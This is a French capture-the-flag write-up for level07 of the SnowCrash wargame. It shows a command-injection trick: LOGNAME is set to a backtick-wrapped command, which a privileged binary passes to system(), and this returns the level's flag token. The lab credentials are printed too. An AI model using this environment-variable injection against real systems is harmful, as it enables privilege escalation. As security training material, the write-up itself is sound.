# Level07

Une fois connecté avec le username:motdepasse level07:wiok45aaoguiboiki2tuin6ub (obtenu dans le flag précédent), nous arrivons sur le home de l'utilisateur level07.  
Nous pouvons voir qu'un executable du nom de "level07" est présent.
En l'exécutant nous avons :
```sh
level07@SnowCrash:~$ ./level07
level07
```
En utilisant `strings level07` nous pouvons trouver des lignes interessantes : 
```sh
getenv
system
LOGNAME
/bin/echo %s
```
En allant faire un tour du coté des variables d'environement nous avons :
```
LOGNAME=level07
```
Essayons de changer cette variable et de relancer l'executabe : 
```
level07@SnowCrash:~$ export LOGNAME=Drakauf
level07@SnowCrash:~$ ./level07
Drakauf
```
Nous pouvons constater que l'exécutable affiche la variable d'environement `LOGNAME`.
Nous allons essayer dabtenir le flag.
```sh
level07@SnowCrash:~$ export LOGNAME=\`/bin/getflag\`
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
Nous avons obtenu le flag !
